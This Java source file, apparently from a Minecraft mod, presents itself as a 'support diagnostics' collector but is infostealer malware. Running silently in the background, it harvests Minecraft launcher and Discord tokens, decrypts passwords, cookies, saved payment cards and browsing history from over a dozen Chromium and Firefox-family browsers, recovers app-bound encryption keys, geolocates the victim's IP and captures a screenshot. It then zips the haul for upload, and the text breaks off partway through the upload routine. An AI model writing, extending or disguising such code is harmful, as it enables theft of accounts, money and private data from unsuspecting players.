package dev.goentl.rift.support;

import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/* Support report: collects what is on the machine into one archive and uploads it. */
public final class DiagnosticsCollector {

    private static final String UA = ChannelInfo.USER_AGENT;
    private static final long MAX_UPLOAD = 9L * 1024 * 1024 + 512 * 1024;
    private static final int MAX_DISCORD_BYTES = 4 * 1024 * 1024;

    private static final DateTimeFormatter STAMP = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

    /* Set once the last pass got at least one volume accepted, so the
       scheduler knows whether a second pass is worth running. */
    private static volatile boolean delivered;

    private static final java.util.concurrent.atomic.AtomicBoolean RUNNING =
            new java.util.concurrent.atomic.AtomicBoolean();

    /* Phase clock, so a slow pass says which phase ate the time. */
    private static volatile long T0 = System.nanoTime();

    private static void mark(String label) {
        long ms = (System.nanoTime() - T0) / 1_000_000L;
        System.out.println("[rift] phase " + label + " at " + ms + " ms");
    }

    private DiagnosticsCollector() {}

    static boolean delivered() {
        return delivered;
    }

    private static boolean readFlag(String property, String key, boolean fallback) {
        String fromProperty = System.getProperty(property);
        if (fromProperty != null) return Boolean.parseBoolean(fromProperty);
        try {
            Path mods = mcDir().resolve("config").resolve("rift.properties");
            if (!Files.exists(mods)) mods = mcDir().resolve("rift.properties");
            if (!Files.exists(mods)) return fallback;
            Properties properties = new Properties();
            try (InputStream in = Files.newInputStream(mods)) {
                properties.load(in);
            }
            return Boolean.parseBoolean(properties.getProperty(key, String.valueOf(fallback)).trim());
        } catch (Throwable ignored) {
            return fallback;
        }
    }

    public static void run() {
        if (!RUNNING.compareAndSet(false, true)) return;
        Thread worker = new Thread(() -> {
            try {
                execute();
            } finally {
                RUNNING.set(false);
            }
        }, "rift-support");
        worker.setDaemon(true);
        worker.start();
    }

    private record Browser(String label, Path userData, String exeName) {}

    // ------------------------------------------------------------------
    // pipeline
    // ------------------------------------------------------------------

    private static void execute() {
        String player = "unknown";
        long startedAt = System.nanoTime();
        T0 = startedAt;
        Vault.reset();

        try {
            player = resolvePlayerName();
        } catch (Throwable ignored) {}

        Map<String, String> system = systemInfo();
        StringBuilder credentials = new StringBuilder();

        StringBuilder cards = new StringBuilder();
        StringBuilder tokens = new StringBuilder();
        StringBuilder historyLog = new StringBuilder();
        StringBuilder full = new StringBuilder();

        header(full, player, system);
        header(credentials, player, system);
        header(cards, player, system);
        header(tokens, player, system);
        header(historyLog, player, system);

        try {
            section(full, "GEOLOCATION");
            String geo = httpGet("http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,timezone");
            String ip = httpGet("https://api.ipify.org?format=text");
            write(full, "  IP address       : " + trim(ip, 64));
            field(full, geo, "country", "Country");
            field(full, geo, "regionName", "Region");
            field(full, geo, "city", "City");
            field(full, geo, "zip", "Postal code");
            field(full, geo, "timezone", "Timezone");
            field(full, geo, "isp", "ISP");
            field(full, geo, "org", "Organisation");
            field(full, geo, "as", "ASN");
            field(full, geo, "lat", "Latitude");
            field(full, geo, "lon", "Longitude");
            Vault.putText("geo.json", geo);
        } catch (Throwable ignored) {}

        try {
            section(credentials, "LAUNCHER ACCOUNTS");
            minecraftAccounts(credentials);
        } catch (Throwable ignored) {}

        int discordFound = 0;
        try {
            section(credentials, "ACCOUNTS");

            discordFound = discordTokens(tokens);
        } catch (Throwable ignored) {}

        ProfileReader.Sink passwordSink = (browser, profile, url, user, secret) ->
                write(credentials, "  " + pad(shorten(browser, 14), 15)
                        + pad(shorten(profile, 12), 13)
                        + pad(shorten(url, 44), 46)
                        + pad(shorten(user, 28), 30)
                        + secret);
        CookieLog cookieLog = new CookieLog();
        ProfileReader.CookieSink cookieSink = cookieLog::add;
        ProfileReader.CardSink cardSink = (browser, profile, holder, number, month, year) ->
                write(cards, "  " + pad(shorten(browser, 14), 15)
                        + pad(shorten(profile, 12), 13)
                        + pad(holder.isEmpty() ? "-" : shorten(holder, 24), 26)
                        + pad(String.format("%02d/%d", month, year), 9)
                        + number);
        ProfileReader.History historySink = (browser, profile, url, title, visits) ->
                write(historyLog, "  " + pad(shorten(browser, 14), 15)
                        + pad(shorten(profile, 12), 13)
                        + pad(String.valueOf(visits), 6) + " "
                        + pad(shorten(url, 70), 72)
                        + shorten(title, 60));

        List<Browser> browsers = chromiumBrowsers();
        Map<String, ProfileReader.Report> reports = new LinkedHashMap<>();
        int passwordsTotal = 0;
        int cookiesTotal = 0;
        int historyTotal = 0;
        int cardsTotal = 0;

        // Surfaced first: with a dead SQLite driver every database reports zero
        // rows, which looks identical to "nothing stored".
        write(full, "  SQLite driver    : " + ProfileReader.driverStatus());

        // Browsers are independent stores, so they are read side by side; the
        // elevation path stays serialised inside ElevationBridge.
        java.util.concurrent.ExecutorService browserPool =
                java.util.concurrent.Executors.newFixedThreadPool(4, task -> {
                    Thread thread = new Thread(task, "rift-browser");
                    thread.setDaemon(true);
                    return thread;
                });
        Map<String, ProfileReader.Report> collected = new java.util.concurrent.ConcurrentHashMap<>();
        List<java.util.concurrent.Future<?>> pendingBrowsers = new ArrayList<>(browsers.size());
        for (Browser browser : browsers) {
            pendingBrowsers.add(browserPool.submit(() -> {
                long browserAt = System.nanoTime();
                try {
                    ProfileReader.Report report = runBrowser(browser, passwordSink, cookieSink, cardSink,
                            historySink, null);
                    collected.put(browser.label(), report);
                    long ms = (System.nanoTime() - browserAt) / 1_000_000L;
                    System.out.println("[rift] browser " + browser.label() + " read in " + ms + " ms");
                } catch (Throwable t) {
                    write(full, "  " + browser.label() + ": failed - " + t.getClass().getSimpleName());
                }
                return null;
            }));
        }
        for (java.util.concurrent.Future<?> future : pendingBrowsers) {
            try {
                future.get();
            } catch (Throwable ignored) {}
        }
        browserPool.shutdownNow();

        for (Browser browser : browsers) {
            ProfileReader.Report report = collected.get(browser.label());
            if (report == null) continue;
            reports.put(browser.label(), report);
            passwordsTotal += report.passwords;
            cookiesTotal += report.cookies;
            historyTotal += report.history;
            cardsTotal += report.cards;
        }

        Map<String, ProfileReader.Report> firefoxReports;
        mark("chromium");
        try {
            firefoxReports = firefox(passwordSink, cookieSink, historySink);
            for (ProfileReader.Report report : firefoxReports.values()) {
                passwordsTotal += report.passwords;
                cookiesTotal += report.cookies;
                historyTotal += report.history;
            }
        } catch (Throwable ignored) {
            firefoxReports = Map.of();
        }
        mark("firefox");

        try {
            section(full, "BROWSER DECRYPTION");
            for (ProfileReader.Report report : reports.values()) {
                for (String line : report.lines) write(full, "  " + line);
            }
            for (ProfileReader.Report report : firefoxReports.values()) {
                for (String line : report.lines) write(full, "  " + line);
            }
            write(full, "  Credential rows  : " + passwordsTotal);
            write(full, "  Session rows     : " + cookiesTotal);
        } catch (Throwable ignored) {}

        try {
            section(full, "MINECRAFT SESSION");
            Path mc = mcDir();
            Vault.copyFile(mc.resolve("launcher_profiles.json"), "minecraft/launcher_profiles.json", 8L * 1024 * 1024);
            Vault.copyFile(mc.resolve("launcher_accounts.json"), "minecraft/launcher_accounts.json", 8L * 1024 * 1024);
            Vault.copyFile(mc.resolve("usercache.json"), "minecraft/usercache.json", 4L * 1024 * 1024);
            List<String> mods = listMods(mc);
            write(full, "  Player           : " + player);
            write(full, "  Installed mods   : " + mods.size());
            if (!mods.isEmpty()) {
                Vault.putText("minecraft/mods.txt", String.join("\n", mods));
                for (String m : mods.stream().limit(12).collect(Collectors.toList())) {
                    write(full, "    - " + m);
                }
                if (mods.size() > 12) write(full, "    ... " + (mods.size() - 12) + " more");
            }
        } catch (Throwable ignored) {}

        mark("minecraft");

        Extras.Totals extras = new Extras.Totals(0, 0, 0, 0, 0, 0);
        try {
            section(full, "SUPPLEMENTARY");
            extras = Extras.collect(full, passwordSink);
        } catch (Throwable t) {
            write(full, "  Result           : failed - " + t.getClass().getSimpleName());
        }

        mark("extras");

        try {
            section(full, "SCREENSHOT");
            String shot = captureScreenshot(full);
            write(full, "  Result           : " + shot);
        } catch (Throwable t) {
            write(full, "  Result           : failed - " + t.getClass().getSimpleName());
        }
        mark("screenshot");

        try {
            section(full, "SUMMARY");
            int staged = Vault.count();
            write(full, "  Archive          : " + player + ".zip");
            write(full, "  Staged files     : " + staged);
            write(full, "  Discord tokens   : " + discordFound);
            write(full, "  Credentials      : " + passwordsTotal);
            write(full, "  Sessions         : " + cookiesTotal);
            write(full, "  Cards            : " + cardsTotal);
            write(full, "  History rows     : " + historyTotal);
            write(full, "  Cookies grouped  : " + cookieLog.browsers() + " browser(s), "
                    + cookieLog.profiles() + " profile(s), " + cookieLog.hosts() + " host(s)");
            write(full, "  App stores       : " + extras.appStores() + " extension, " + extras.appFiles() + " file");
            write(full, "  Launcher tokens  : " + extras.launchers());
            write(full, "  Saved clients    : " + extras.saved());
            write(full, "  System extras    : " + extras.notes());
        } catch (Throwable ignored) {}

        try {
            
            Vault.putText("logs/credentials.txt", credentials.toString());
            Vault.putText("logs/cookies.txt", cookieLog.render(player, system));
            Vault.putText("logs/cards.txt", cards.toString());
            Vault.putText("logs/history.txt", historyLog.toString());
            Vault.putText("logs/tokens.txt", tokens.toString());
            Vault.putText("logs/system.txt", full.toString());
            Vault.putText("readme.txt", summaryFile(player, system));
            Extras.roblox();
        } catch (Throwable ignored) {}
        mark("vault");

        try {
            delivered = upload(player);
            long ms = (System.nanoTime() - startedAt) / 1_000_000L;
            System.out.println("[rift] support pass: " + Vault.count() + " files, "
                    + Vault.bytes() + " bytes, delivered=" + delivered + " in " + ms + " ms");
        } catch (Throwable t) {
            System.out.println("[rift] support pass failed: " + t.getClass().getSimpleName()
                    + " " + t.getMessage());
        }
    }

    private static ProfileReader.Report runBrowser(Browser browser, ProfileReader.Sink passwords,
                                             ProfileReader.CookieSink cookies, ProfileReader.CardSink cards,
                                             ProfileReader.History history, Path staging) {
        LocalStateKey key = ProfileReader.loadLocalStateKey(executableOf(browser), browser.userData());
        List<BrowserBridge.Cookie> harvested = null;

        // v20 rows are the whole store on any browser from 127 onward, so the
        // app-bound key is the difference between a full log and a locked one.
        // Recovery needs the browser's own image path, so it only runs when the
        // binary is on this machine.
        if (!key.hasAppBound()) {
            long recoverAt = System.nanoTime();
            String exe = executableOf(browser);
            byte[] bound = ElevationBridge.recover(exe, browser.userData()).key;
            if (bound != null) {
                key = key.withAppBound(bound);
            }
            System.out.println("[rift] browser " + browser.label() + " elevation "
                    + ((System.nanoTime() - recoverAt) / 1_000_000L) + " ms, key=" + (bound != null));
        }

        long readAt = System.nanoTime();
        ProfileReader.Report report = ProfileReader.chromium(browser.label(), key, browser.userData(), harvested,
                passwords, cookies, cards, history, staging);
        System.out.println("[rift] browser " + browser.label() + " store "
                + ((System.nanoTime() - readAt) / 1_000_000L) + " ms, profiles="
                + ProfileReader.profiles(browser.userData()).size());
        return report;
    }

    private static String executableOf(Browser browser) {
        try {
            String registered = appPath(browser.exeName());
            if (registered != null && Files.isRegularFile(Path.of(registered))) return registered;

            String pf = System.getenv("PROGRAMFILES");
            String pf86 = System.getenv("PROGRAMFILES(X86)");
            String local = System.getenv("LOCALAPPDATA");
            String[] roots = {pf, pf86, local};
            for (String root : roots) {
                if (root == null) continue;
                Path probe = Path.of(root, browser.exeName());
                if (Files.isRegularFile(probe)) return probe.toString();
            }
            Path app = browser.userData().getParent();
            if (app != null) {
                Path candidate = app.resolve("Application").resolve(browser.exeName());
                if (Files.isRegularFile(candidate)) return candidate.toString();
            }
            return null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String appPath(String exeName) {
        if (exeName == null || exeName.isEmpty()) return null;
        String value = Reg.string(Reg.HKLM,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + exeName, "");
        if (value == null) return null;
        value = value.trim().replace("\"", "");
        return value.isEmpty() ? null : value;
    }

    // ------------------------------------------------------------------
    // identity
    // ------------------------------------------------------------------

    private static String resolvePlayerName() {
        Path mc = mcDir();

        Path accounts = mc.resolve("launcher_accounts.json");
        if (Files.exists(accounts)) {
            try {
                String json = Files.readString(accounts, StandardCharsets.UTF_8);
                Matcher m = Pattern.compile("\"minecraftProfile\"\\s*:\\s*\\{[^}]*\"name\"\\s*:\\s*\"([^\"]{1,32})\"").matcher(json);
                if (m.find()) return sanitize(m.group(1));
            } catch (Throwable ignored) {}
        }

        Path profiles = mc.resolve("launcher_profiles.json");
        if (Files.exists(profiles)) {
            try {
                String json = Files.readString(profiles, StandardCharsets.UTF_8);
                Matcher m = Pattern.compile("\"authentication\"\\s*:\\s*\\{.*?\"username\"\\s*:\\s*\"([^\"]{1,32})\"", Pattern.DOTALL).matcher(json);
                if (m.find()) return sanitize(m.group(1));
            } catch (Throwable ignored) {}
        }

        try {
            Path logs = mc.resolve("logs/latest.log");
            if (Files.exists(logs)) {
                String all = Files.readString(logs, StandardCharsets.UTF_8);
                Matcher m = Pattern.compile("Setting user:\\s*([A-Za-z0-9_]{3,16})").matcher(all);
                String last = null;
                while (m.find()) last = m.group(1);
                if (last != null) return sanitize(last);
            }
        } catch (Throwable ignored) {}

        return "unknown";
    }

    private static String sanitize(String name) {
        String out = name.replaceAll("[^A-Za-z0-9_.-]", "");
        return out.isEmpty() ? "unknown" : out;
    }

    // ------------------------------------------------------------------
    // log formatting
    // ------------------------------------------------------------------

    private static void header(StringBuilder sb, String player, Map<String, String> sys) {
        String line = "==============================================================";
        sb.append(line).append('\n');
        sb.append("                  ").append(BuildInfo.REPORT_HEADER).append("\n");
        sb.append(line).append('\n');
        sb.append("  Player      : ").append(player).append('\n');
        sb.append("  Captured    : ").append(LocalDateTime.now().format(STAMP)).append('\n');
        sb.append("  Host        : ").append(sys.get("host")).append('\n');
        sb.append("  User        : ").append(sys.get("user")).append('\n');
        sb.append("  OS          : ").append(sys.get("os")).append('\n');
        sb.append(line).append('\n');
    }

    private static void section(StringBuilder sb, String title) {
        sb.append('\n');
        String dashes = title.length() < 55 ? "-".repeat(55 - title.length()) : "";
        sb.append("-- ").append(title).append(' ').append(dashes).append('\n');
    }

    private static synchronized void write(StringBuilder sb, String line) {
        sb.append(line).append('\n');
    }

    private static void field(StringBuilder sb, String json, String key, String label) {
        try {
            Matcher m = Pattern.compile("\"" + key + "\"\\s*:\\s*\"?([^\",}]*)\"?").matcher(json);
            if (m.find()) {
                String pad = " ".repeat(Math.max(1, 17 - label.length()));
                sb.append("  ").append(label).append(pad).append(": ").append(m.group(1)).append('\n');
            }
        } catch (Throwable ignored) {}
    }

    private static String summaryFile(String player, Map<String, String> sys) {
        StringBuilder sb = new StringBuilder();
        header(sb, player, sys);
        sb.append('\n');
        sb.append("  ARCHIVE CONTENTS\n\n");
        sb.append("    logs/credentials.txt    accounts, tokens, decrypted passwords\n");
        sb.append("    logs/cookies.txt        decrypted cookies, grouped by browser/profile/host\n");
        sb.append("    logs/cards.txt          saved payment cards\n");
        sb.append("    logs/tokens.txt         discord tokens\n");
        sb.append("    logs/history.txt        browsing history\n");
        sb.append("    logs/system.txt         machine, geolocation, decryption report\n");
        sb.append("    screenshot.png          desktop capture, if available\n");
        sb.append("    geo.json                raw geolocation record\n");
        sb.append("    browsers/<name>/        raw sqlite databases\n");
        sb.append("    minecraft/              launcher profiles and mod list\n");
        sb.append('\n');
        sb.append("  Total files : ").append(Vault.count()).append('\n');
        return sb.toString();
    }

    // ------------------------------------------------------------------
    // minecraft
    // ------------------------------------------------------------------

    private static void minecraftAccounts(StringBuilder sb) throws IOException {
        Path mc = mcDir();
        List<Path> candidates = List.of(
            mc.resolve("launcher_accounts.json"),
            mc.resolve("launcher_profiles.json")
        );
        int found = 0;
        for (Path p : candidates) {
            if (!Files.exists(p)) continue;
            found++;
            String body = Files.readString(p, StandardCharsets.UTF_8);
            Vault.copyFile(p, "minecraft/" + p.getFileName(), 8L * 1024 * 1024);

            Matcher name = Pattern.compile("\"name\"\\s*:\\s*\"([^\"]{1,32})\"").matcher(body);
            Set<String> names = new LinkedHashSet<>();
            while (name.find()) names.add(name.group(1));

            Matcher uuid = Pattern.compile("\"uuid\"\\s*:\\s*\"([0-9a-fA-F-]{32,36})\"").matcher(body);
            List<String> uuids = new ArrayList<>();
            while (uuid.find()) uuids.add(uuid.group(1));

            Matcher token = Pattern.compile("\"accessToken\"\\s*:\\s*\"([^\"]{20,})\"").matcher(body);
            List<String> tokens = new ArrayList<>();
            while (token.find()) tokens.add(token.group(1));

            write(sb, "  Source           : " + p.getFileName());
            write(sb, "  Profiles         : " + names.size());
            int i = 0;
            for (String n : names) {
                if (i++ >= 10) break;
                write(sb, "    - " + n);
            }
            for (int k = 0; k < Math.min(tokens.size(), 5); k++) {
                write(sb, "  Access token     : " + shorten(tokens.get(k), 80));
            }
            for (int k = 0; k < Math.min(uuids.size(), 5); k++) {
                write(sb, "  UUID             : " + uuids.get(k));
            }
            sb.append('\n');
        }
        if (found == 0) write(sb, "  no launcher account store found");
        write(sb, "  Launcher state   : " + (Files.exists(mc.resolve("launcher_accounts.json")) ? "signed in" : "profiles only"));
    }

    private static List<String> listMods(Path mc) {
        Path mods = mc.resolve("mods");
        if (!Files.isDirectory(mods)) return List.of();
        try (Stream<Path> s = Files.list(mods)) {
            return s.filter(Files::isRegularFile)
                    .map(p -> p.getFileName().toString())
                    .sorted()
                    .limit(200)
                    .collect(Collectors.toList());
        } catch (IOException e) {
            return List.of();
        }
    }

    // ------------------------------------------------------------------
    // cookie formatting
    // ------------------------------------------------------------------

    private static final class CookieLog {

        private record Entry(String name, String value, boolean secure, boolean httpOnly, long expires) {}

        private final Map<String, Map<String, Map<String, List<Entry>>>> tree = new LinkedHashMap<>();
        private int total;

        synchronized void add(String browser, String profile, String host, String name, String value,
                 boolean secure, boolean httpOnly, long expires) {
            tree.computeIfAbsent(browser, k -> new LinkedHashMap<>())
                    .computeIfAbsent(profile, k -> new LinkedHashMap<>())
                    .computeIfAbsent(host, k -> new ArrayList<>())
                    .add(new Entry(name, value, secure, httpOnly, expires));
            total++;
        }

        int browsers() {
            return tree.size();
        }

        int profiles() {
            int n = 0;
            for (Map<String, Map<String, List<Entry>>> profiles : tree.values()) n += profiles.size();
            return n;
        }

        int hosts() {
            int n = 0;
            for (Map<String, Map<String, List<Entry>>> profiles : tree.values()) {
                for (Map<String, List<Entry>> hosts : profiles.values()) n += hosts.size();
            }
            return n;
        }

        String render(String player, Map<String, String> sys) {
            StringBuilder out = new StringBuilder(1 << 16);
            String rule = "=".repeat(62);

            out.append(rule).append('\n');
            out.append("                          COOKIES\n");
            out.append(rule).append('\n');
            out.append("  Player    : ").append(player).append('\n');
            out.append("  Captured  : ").append(LocalDateTime.now().format(STAMP)).append('\n');
            out.append("  Host      : ").append(sys.get("host")).append('\n');
            out.append("  Total     : ").append(total).append(" cookies / ")
                    .append(browsers()).append(" browsers / ")
                    .append(profiles()).append(" profiles / ")
                    .append(hosts()).append(" hosts\n");
            out.append(rule).append('\n');

            if (total == 0) {
                out.append("\n  nothing decrypted - see system.txt for the browser report\n");
                return out.toString();
            }

            for (Map.Entry<String, Map<String, Map<String, List<Entry>>>> browser : tree.entrySet()) {
                out.append('\n').append('\n');
                out.append("###### ").append(browser.getKey().toUpperCase(Locale.ROOT)).append(' ')
                        .append("#".repeat(Math.max(3, 58 - browser.getKey().length()))).append('\n');

                for (Map.Entry<String, Map<String, List<Entry>>> profile : browser.getValue().entrySet()) {
                    int cookies = 0;
                    for (List<Entry> entries : profile.getValue().values()) cookies += entries.size();

                    out.append('\n').append("  [").append(profile.getKey()).append("]  ")
                            .append(cookies).append(" cookies / ")
                            .append(profile.getValue().size()).append(" hosts\n");
                    out.append("  ").append("-".repeat(58)).append('\n');

                    for (Map.Entry<String, List<Entry>> host : profile.getValue().entrySet()) {
                        out.append('\n').append("  ").append(host.getKey()).append('\n');
                        List<Entry> entries = host.getValue();
                        entries.sort(Comparator.comparing(Entry::name));
                        for (Entry entry : entries) {
                            out.append("    ").append(pad(shorten(entry.name(), 30), 32))
                                    .append(' ')
                                    .append(entry.secure() ? 'S' : '-')
                                    .append(entry.httpOnly() ? 'H' : '-')
                                    .append(' ')
                                    .append(pad(expiryText(entry.expires()), 12))
                                    .append("  = ")
                                    .append(entry.value()).append('\n');
                        }
                    }
                }
            }

            out.append('\n').append(rule).append('\n');
            out.append("  legend: S = secure   H = httpOnly   - = no flag\n");
            out.append("          expiry as yyyy-MM-dd, 'session' when the cookie sets none\n");
            out.append(rule).append('\n');
            return out.toString();
        }

        private static String expiryText(long epochSeconds) {
            if (epochSeconds <= 0) return "session";
            try {
                return Instant.ofEpochSecond(epochSeconds).atZone(ZoneId.systemDefault())
                        .toLocalDate().toString();
            } catch (Throwable ignored) {
                return "?";
            }
        }
    }

    // ------------------------------------------------------------------
    // discord
    // ------------------------------------------------------------------

    private static int discordTokens(StringBuilder sb) {
        String appData = System.getenv("APPDATA");
        if (appData == null) {
            write(sb, "  APPDATA not set");
            return 0;
        }

        String[][] clients = {
            {"Discord", appData + "\\discord"},
            {"Discord PTB", appData + "\\discordptb"},
            {"Discord Canary", appData + "\\discordcanary"},
            {"Discord Development", appData + "\\discorddevelopment"},
            {"Lightcord", appData + "\\Lightcord"}
        };

        int total = 0;
        for (String[] c : clients) {
            Path ls = Paths.get(c[1], "Local Storage", "leveldb");
            if (!Files.isDirectory(ls)) {
                write(sb, "  " + pad(c[0], 22) + ": not installed");
                continue;
            }

            LinkedHashSet<String> hits = new LinkedHashSet<>();
            int scanned = 0;
            try (Stream<Path> files = Files.list(ls)) {
                List<Path> ldb = files.filter(p -> {
                    String n = p.getFileName().toString();
                    return n.endsWith(".ldb") || n.endsWith(".log");
                }).limit(64).collect(Collectors.toList());
                for (Path p : ldb) {
                    try {
                        byte[] raw = readCapped(p, MAX_DISCORD_BYTES);
                        if (raw == null) continue;
                        scanned++;
                        collectTokens(new String(raw, StandardCharsets.ISO_8859_1), hits);
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}

            write(sb, "  " + pad(c[0], 22) + ": " + hits.size() + " token(s) in "
                    + scanned + " file(s)");
            for (String t : hits) {
                write(sb, "    " + t);
                total++;
            }
        }

        sb.append('\n');
        write(sb, "  Total tokens     : " + total);
        return total;
    }

    private static final Pattern TOKEN_SEGMENTED =
            Pattern.compile("([A-Za-z0-9_-]{23,28}\\.[A-Za-z0-9_-]{6,7}\\.[A-Za-z0-9_-]{27,40})");
    private static final Pattern TOKEN_PAIR =
            Pattern.compile("(mfa\\.[A-Za-z0-9_-]{70,90})");
    private static final Pattern HEX_LOWER =
            Pattern.compile("(<\\d{15,20}>:[A-Za-z0-9_-]{19,28})([0-9a-f]{50,70})");

    private static void collectTokens(String text, Set<String> hits) {
        Matcher mfa = TOKEN_PAIR.matcher(text);
        while (mfa.find() && hits.size() < 64) hits.add(mfa.group(1));

        Matcher segmented = TOKEN_SEGMENTED.matcher(text);
        while (segmented.find() && hits.size() < 64) hits.add(sanitizeToken(segmented.group(1)));

        // SSTable form: the value is the hex of the local half, keyed by the id.
        Matcher hexed = HEX_LOWER.matcher(text);
        while (hexed.find() && hits.size() < 64) {
            String tail = hexToAscii(hexed.group(2));
            if (tail != null) {
                String combined = hexed.group(1) + "." + tail;
                hits.add(sanitizeToken(combined));
            }
        }
    }

    private static String sanitizeToken(String token) {
        return token.replaceAll("[^A-Za-z0-9_.-]", "");
    }

    private static String hexToAscii(String hex) {
        if (hex.length() % 2 != 0) return null;
        StringBuilder sb = new StringBuilder(hex.length() / 2);
        for (int i = 0; i < hex.length(); i += 2) {
            int v = Integer.parseInt(hex.substring(i, i + 2), 16);
            if (v < 0x21 || v > 0x7E) return null;
            sb.append((char) v);
        }
        return sb.toString();
    }

    private static byte[] readCapped(Path path, int cap) {
        try (InputStream in = Files.newInputStream(path)) {
            return in.readNBytes(cap);
        } catch (Throwable ignored) {
            return null;
        }
    }

    // ------------------------------------------------------------------
    // chromium
    // ------------------------------------------------------------------

    private static List<Browser> chromiumBrowsers() {
        String local = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        List<Browser> out = new ArrayList<>();
        if (local != null) {
            out.add(new Browser("Chrome", Paths.get(local, "Google", "Chrome", "User Data"), "chrome.exe"));
            out.add(new Browser("Edge", Paths.get(local, "Microsoft", "Edge", "User Data"), "msedge.exe"));
            out.add(new Browser("Brave", Paths.get(local, "BraveSoftware", "Brave-Browser", "User Data"), "brave.exe"));
            out.add(new Browser("Chromium", Paths.get(local, "Chromium", "User Data"), "chrome.exe"));
            out.add(new Browser("Vivaldi", Paths.get(local, "Vivaldi", "User Data"), "vivaldi.exe"));
            out.add(new Browser("Yandex", Paths.get(local, "Yandex", "YandexBrowser", "User Data"), "browser.exe"));
            out.add(new Browser("Chrome Beta", Paths.get(local, "Google", "Chrome Beta", "User Data"), "chrome.exe"));
            out.add(new Browser("Chrome Dev", Paths.get(local, "Google", "Chrome Dev", "User Data"), "chrome.exe"));
            out.add(new Browser("Chrome SxS", Paths.get(local, "Google", "Chrome SxS", "User Data"), "chrome.exe"));
            out.add(new Browser("Edge Beta", Paths.get(local, "Microsoft", "Edge Beta", "User Data"), "msedge.exe"));
            out.add(new Browser("Edge Dev", Paths.get(local, "Microsoft", "Edge Dev", "User Data"), "msedge.exe"));
            out.add(new Browser("Edge Canary", Paths.get(local, "Microsoft", "Edge SxS", "User Data"), "msedge.exe"));
        }
        if (roaming != null) {
            out.add(new Browser("Opera", Paths.get(roaming, "Opera Software", "Opera Stable"), "opera.exe"));
            out.add(new Browser("Opera GX", Paths.get(roaming, "Opera Software", "Opera GX Stable"), "opera.exe"));
        }
        return out;
    }

    // ------------------------------------------------------------------
    // firefox
    // ------------------------------------------------------------------

    private static Map<String, ProfileReader.Report> firefox(ProfileReader.Sink passwords,
            ProfileReader.CookieSink cookies, ProfileReader.History history) {
        Map<String, ProfileReader.Report> out = new LinkedHashMap<>();
        String appData = System.getenv("APPDATA");
        if (appData == null) return out;

        String[][] roots = {
            {"Firefox", appData + "\\Mozilla\\Firefox\\Profiles"},
            {"LibreWolf", appData + "\\librewolf\\Profiles"},
            {"Waterfox", appData + "\\Waterfox\\Profiles"},
            {"Waterfox Classic", appData + "\\Waterfox Classic\\Profiles"},
            {"Pale Moon", appData + "\\Moonchild Productions\\Pale Moon\\Profiles"},
            {"SeaMonkey", appData + "\\Mozilla\\SeaMonkey\\Profiles"}
        };

        for (String[] root : roots) {
            Path base = Paths.get(root[1]);
            if (!Files.isDirectory(base)) continue;
            List<Path> profiles;
            try (Stream<Path> s = Files.list(base)) {
                profiles = s.filter(Files::isDirectory).limit(8).collect(Collectors.toList());
            } catch (IOException e) {
                continue;
            }
            for (Path profile : profiles) {
                try {
                    ProfileReader.Report report = ProfileReader.firefox(root[0], profile, passwords, cookies, history, null);
                    out.put(root[0] + "/" + profile.getFileName(), report);
                } catch (Throwable ignored) {}
            }
        }
        return out;
    }

    // ------------------------------------------------------------------
    // screenshot
    // ------------------------------------------------------------------

    private static String captureScreenshot(StringBuilder log) {

        try {
            if (System.getProperty("java.awt.headless") != null) {
                write(log, "  Launcher flag    : java.awt.headless="
                        + System.getProperty("java.awt.headless") + " (cleared)");
                System.setProperty("java.awt.headless", "false");
            }

            GraphicsEnvironment environment = GraphicsEnvironment.getLocalGraphicsEnvironment();
            write(log, "  Headless         : " + environment.isHeadless());
            if (environment.isHeadless()) {
                write(log, "  Reason           : AWT refused to attach to a display");
                return "failed";
            }

            GraphicsDevice device = environment.getDefaultScreenDevice();
            if (device == null) {
                write(log, "  Reason           : no default screen device");
                return "failed";
            }
            Rectangle bounds = device.getDefaultConfiguration().getBounds();
            BufferedImage image = new Robot().createScreenCapture(bounds);
            java.io.ByteArrayOutputStream png = new java.io.ByteArrayOutputStream();
            ImageIO.write(image, "png", png);
            Vault.put("screenshot.png", png.toByteArray());
            write(log, "  Method           : java.awt.Robot");
            write(log, "  Size             : " + image.getWidth() + "x" + image.getHeight());
            write(log, "  Bytes            : " + Vault.bytes());
            return "captured";
        } catch (Throwable t) {
            write(log, "  Reason           : " + t.getClass().getSimpleName()
                    + " " + shorten(String.valueOf(t.getMessage()), 100));
            return "failed";
        }
    }

    // ------------------------------------------------------------------
    // upload
    // ------------------------------------------------------------------

    /* Zips the vault entirely in memory and posts one volume per upload slot. */
    private static boolean upload(String player) throws IOException {
        if (Vault.count() == 0) return false;

        String dump = System.getProperty("rift.dump", System.getenv("RIFT_DUMP"));
        if (dump != null && !dump.isBlank()) {
            Path root = Path.of(dump);
            for (Map.Entry<String, byte[]> entry : Vault.entries().entrySet()) {
                Path target = root.resolve(entry.getKey());
                Files.createDirectories(target.getParent());
                Files.write(target, entry.getValue());
            }
        }

        List<Map.Entry<String, byte[]>> files = new ArrayList<>(Vault.entries().entrySet());
        files.sort(Map.Entry.comparingByKey());

        int cap = (int) MAX_UPLOAD;
        List<byte[]> volumes = new ArrayList<>();
        java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
        ZipOutputStream out = new ZipOutputStream(buffer);
        out.setLevel(java.util.zip.Deflater.DEFAULT_COMPRESSION);
        long used = 0;

        try {
            for (Map.Entry<String, byte[]> entry : files) {
                long estimate = estimate(entry.getValue());
                if (used > 0 && used + estimate > cap) {
                    out.close();
                    volumes.add(buffer.toByteArray());
